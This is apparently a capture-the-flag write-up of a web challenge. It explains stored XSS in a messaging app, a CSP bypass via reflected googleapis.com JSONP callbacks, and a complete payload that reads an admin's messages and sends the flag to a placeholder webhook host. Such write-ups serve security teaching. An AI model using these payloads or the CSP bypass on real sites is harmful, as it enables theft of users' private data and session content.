# Massagold — Web Challenge

**CTF:** Cyber Apocalypse 2026  
**Category:** Web  
**Flag:** `HTB{m3554g3_1n_7h3_cu570dy_ch41n_d62b231effea7b997ea10bcadd3de9dd}`

---

## Scenario

Someone is using sealed harbor letters to make Damas's ships look late, unsafe, and unreliable. If this continues, Eastreach merchants will leave his ports and his enemies will profit from the panic. Lyra needs to steal the first false letter from the harbor office and bring it to Damas, because proof of sabotage is the only thing that can make him open his routes to Stormbound.

## Analysis

The challenge is a messaging web app (Node.js/Express, EJS, SQLite) with a Playwright Firefox bot that visits any message sent to the `admin` user.

### Architecture

- **Express** server on `127.0.0.10:3000`
- **nginx** reverse proxy on port 80
- **SQLite** database with `users` and `messages` tables
- **Playwright Firefox bot** that logs in as admin and visits messages sent to admin

### Seed Data (entrypoint.js)

Six users are created with random 24-byte passwords: `admin`, `archivist`, `scribe`, `ravenmaster`, `minstrel`, `alchemist`. The flag is stored in a message from **archivist → admin**:

```
Archive notice:

The sealed royal record reads:
HTB{...flag...}
```

### Routes

| Endpoint | Method | Auth | Purpose |
|---|---|---|---|
| `/` | GET | Required | Inbox |
| `/messages/new` | GET | Required | Compose form |
| `/messages` | POST | Required | Send message |
| `/messages/:id` | GET | Required | View message |
| `/register` | GET/POST | No | Register |
| `/login` | GET/POST | No | Login |
| `/logout` | POST | Required | Logout |

### Bot Behaviour (bot.js)

When ANY user sends a message to `admin`, the bot:
1. Launches headless Firefox
2. Reads admin credentials from `/app/admin_credentials.json`
3. Logs in as admin
4. Navigates to `/messages/<id>` (the sent message)
5. Waits **2 seconds**
6. Closes the browser

Messages are processed **sequentially** via a promise chain queue.

## Vulnerability 1: Stored XSS

In `views/message.ejs`, line 17:

```ejs
<pre class="letter-copy"><%- message.content %></pre>
```

The `<%-` tag outputs content **unescaped** (raw HTML). The `message.content` is stored exactly as sent via `POST /messages`. Any HTML/JavaScript in the content is rendered into the page in the admin's session context.

The message content is initially inside a `<section hidden>` (behind a "sealed scroll" button). However, `hidden` only affects CSS visibility — scripts in hidden elements **still execute** in the DOM.

## Vulnerability 2: CSP with `https://www.googleapis.com`

The Content-Security-Policy set by the middleware:

```
default-src 'self'
script-src 'self' https://www.googleapis.com
style-src 'self'
img-src 'self' data:
font-src 'self' data:
connect-src 'self'
object-src 'none'
form-action 'self'
frame-ancestors 'none'
```

Key gaps:

- **`base-uri` not set** — `<base>` tag can point to any origin
- **`navigate-to` not set** — `<meta http-equiv=\"refresh\">` and `location=`/`window.open()` are unrestricted
- **`https://www.googleapis.com` in `script-src`** — Google API JSONP endpoints are allowed

## Exploitation

### Step 1 — Discover Google API JSONP callback injection

The Google API endpoints at `www.googleapis.com` support JSONP via a `callback` parameter:

```
https://www.googleapis.com/oauth2/v3/tokeninfo?callback=alert
```

This returns:
```javascript
// API callback
alert({...});
```

The API validates callback names with a character allowlist (`^[a-zA-Z0-9_$.\[\]]+$`). Characters like `(`, `)`, and `'` are rejected — **but the error response STILL echoes the invalid callback name** into the JavaScript output:

```javascript
// API callback
document.getElementById('f').submit({
  "error": {
    "code": 400,
    "message": "Invalid JSONP callback name: 'document.getElementById('f').submit'..."
  }
});
```

This means **any JavaScript expression** can be used as the callback, even complex function calls with arguments. The callback is wrapped as `EXPRESSION({...})` — the expression runs, and its result is called as a function with the error data object.

### Step 2 — IIFE gadget to bypass the `({...})` wrapper

Since the expression is called as a function with the error data, we use an Immediately Invoked Function Expression (IIFE) that returns a no-op function:

```javascript
(function(){ /* payload */ ;return function(){}})()
```

The response becomes:
```javascript
(function(){ /* payload */ ;return function(){}})()({
  "error": {...}
});
```

The IIFE executes the exploit payload, returns a no-op `function(){}`, and the no-op is harmlessly called with the error object.

### Step 3 — Exfiltrate the flag via XHR + navigation

The IIFE uses `XMLHttpRequest` (allowed by `connect-src 'self'`) to:
1. Fetch admin's inbox (`GET /`) — find the archivist message ID
2. Fetch the archivist message (`GET /messages/<id>`) — extract the flag
3. Navigate to an external webhook via `window.open()` (navigation is unrestricted — no `navigate-to` CSP directive)

**Final exploit message content:**
```html
</pre></div></section></main>
<script src="https://www.googleapis.com/oauth2/v3/tokeninfo?callback=(function(){var x=new XMLHttpRequest();x.onload=function(){var m=x.responseText.match(/href=\"\/messages\/(\d+)\"[^>]*>.*?archivist/is);if(m){var x2=new XMLHttpRequest();x2.onload=function(){var f=x2.responseText.match(/HTB\{[^}]+\}/);if(f)open('https://WEBHOOK/?flag='+encodeURIComponent(f[0]))};x2.open('GET','/messages/'+m[1],true);x2.send()}};x.open('GET','/',true);x.send();return function(){}})()">
</script>
```

The `</pre></div></section></main>` breaks out of the hidden section so the form/script are placed directly in `<body>`, ensuring the DOM is clean and accessible.

### Step 4 — Receive the flag

The webhook receives a navigation request with the flag in the query string:

```
GET /?flag=HTB{m3554g3_1n_7h3_cu570dy_ch41n_d62b231effea7b997ea10bcadd3de9dd}
```

## How We Solved It — Reasoning

The challenge narrative — "steal the first false letter from the harbor office" — pointed directly at accessing the archivist's message in admin's inbox. The stored XSS in the EJS template was obvious (the `<%-` vs `<%=` mistake), and the bot visiting admin's messages was the delivery mechanism.

The CSP was the real puzzle. `script-src 'self' https://www.googleapis.com` restricted scripts to the same origin and Google's API servers. Testing showed Google's JSONP endpoints accept a `callback` parameter — and critically, even **invalid** callbacks (with characters like parentheses or quotes) get **echoed into the error response** as valid JavaScript. The API wraps the expression as `CALLBACK({...})`, so the expression's return value gets called as a function with the error data.

The IIFE trick (`(function(){...;return function(){}})()`) solved the function-call mismatch: the inner payload runs immediately, and the returned no-op function absorbs the unwanted `({...})` call.

Once arbitrary JS execution was achieved, the rest was standard: same-origin XHR to read admin's inbox (finding the archivist message by matching `archivist` in the HTML), a second XHR to read the flag message, and an unrestricted `window.open()` call to exfiltrate — since `navigate-to` was not in the CSP.

## Key Takeaways

- **Google API JSONP endpoints reflect invalid callback names** — even validation errors get wrapped in the callback expression and executed. This turns any CSP allowlisting `www.googleapis.com` into a full JS execution bypass.
- **IIFE gadgets** — when a JSONP response calls `EXPRESSION({...})`, wrapping the payload in `(function(){...;return function(){}})()` lets the inner exploit run while the no-op return value absorbs the argument call.
- **CSP gaps compound** — `connect-src 'self'` allows same-origin XHR, and missing `navigate-to` allows unrestricted navigation to external URLs. Alone neither is dangerous, but combined with JS execution they form a complete exfiltration chain.
- **Always verify CSP enforcement** — test whether the CSP is actually enforced in the headless browser used by the bot (this challenge's Firefox 151 properly enforced CSP, requiring the bypass).
